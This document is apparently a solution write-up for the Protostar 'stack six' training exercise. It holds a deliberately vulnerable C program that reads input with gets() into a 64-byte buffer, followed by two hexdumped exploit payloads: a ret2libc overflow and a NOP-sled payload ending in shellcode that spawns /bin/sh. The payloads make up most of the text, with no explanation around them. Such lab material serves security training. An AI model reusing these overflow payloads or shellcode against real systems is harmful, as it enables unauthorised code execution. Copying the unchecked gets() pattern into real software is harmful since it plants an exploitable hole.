## [Source code](https://exploit.education/protostar/stack-six/#source-code)
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

## exploit_stack6_ret2libc
```hexdump
  Offset: 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 	
00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
00000010: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
00000020: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
00000030: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
00000040: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
00000050: B0 FF EC B7 C0 60 EC B7 BF 63 FB B7                0.l7@`l7?c{7

```

## exploit_stack6_rop_with_shellcode
```hexdump
  Offset: 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 	
00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
00000010: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
00000020: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
00000030: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
00000040: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA
00000050: F9 84 04 08 DE F7 FF BF 90 90 90 90 90 90 90 90    y...^w.?........
00000060: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
00000070: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
00000080: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
00000090: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
000000a0: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
000000b0: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
000000c0: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
000000d0: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
000000e0: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
000000f0: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
00000100: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
00000110: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
00000120: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
00000130: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
00000140: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
00000150: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
00000160: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
00000170: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
00000180: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
00000190: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
000001a0: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
000001b0: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
000001c0: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
000001d0: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................
000001e0: 90 90 90 90 90 90 90 90 31 C0 50 68 2F 2F 73 68    ........1@Ph//sh
000001f0: 68 2F 62 69 6E 89 E3 50 53 89 E1 B0 0B CD 80       h/bin.cPS.a0.M.

```
